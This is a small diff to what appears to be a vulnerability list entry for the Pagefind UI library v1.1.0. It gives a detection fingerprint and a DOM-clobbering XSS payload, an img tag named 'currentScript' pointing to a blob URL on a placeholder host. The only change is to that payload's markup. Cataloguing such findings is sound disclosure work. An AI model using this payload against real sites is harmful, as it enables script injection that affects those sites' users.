@@ -6,7 +6,7 @@
 + Stars: 3.3K
 + Version: v1.1.0
 + Fingerprint: `typeof PagefindUI !== 'undefined'`
-+ Payload: ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/a.js"></img>```
++ Payload: ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/a.js">```
 + Impact: XSS
 + CVE: N/A
 + Status: Accepted
